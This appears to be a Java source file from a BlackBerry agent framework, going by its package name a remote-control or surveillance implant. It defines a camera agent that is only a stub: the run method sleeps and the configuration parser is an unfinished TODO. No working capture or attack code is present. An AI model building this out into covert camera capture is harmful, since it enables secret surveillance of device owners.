package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CamAgent extends Agent {
	//#debug
    static Debug debug = new Debug("CamAgent", DebugLevel.VERBOSE);

    public CamAgent(boolean agentStatus) {
        super(Agent.AGENT_CAM, agentStatus, true, "CamAgent");
    }

    protected CamAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");
        this.sleepUntilStopped();

    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
